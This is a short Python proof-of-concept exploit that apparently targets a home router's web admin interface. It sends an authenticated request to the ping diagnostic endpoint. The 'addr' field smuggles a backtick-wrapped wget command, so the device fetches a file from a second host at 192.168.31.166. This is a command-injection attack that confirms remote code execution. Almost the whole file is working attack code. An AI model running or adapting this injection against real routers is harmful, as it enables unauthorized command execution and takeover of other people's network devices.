#!/usr/bin/env python3
import requests

url = "http://192.168.31.200/stok=your_stok_value_here/ds"

headers = {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/json; charset=UTF-8",
    "X-Requested-With": "XMLHttpRequest",
    "Origin": "http://192.168.31.200",
    "Referer": "http://192.168.31.200",
    "Connection": "close"
}

data = {
    "diagnose": {
        "start": {
            "diag_type": "ping",
            "addr": "www.baidu.com`wget http://192.168.31.166:8000/JZP.txt`",
            "num": "4",
            "size": "64",
            "timeout": "1"
        }
    },
    "method": "do"
}

try:
    response = requests.post(
        url,
        headers=headers,
        json=data,
        timeout=30
    )

    print("Status Code:", response.status_code)
    print("Response Headers:", response.headers)
    print("Response Body:")
    print(response.text)

except requests.exceptions.RequestException as e:
    print("Request failed:", e)
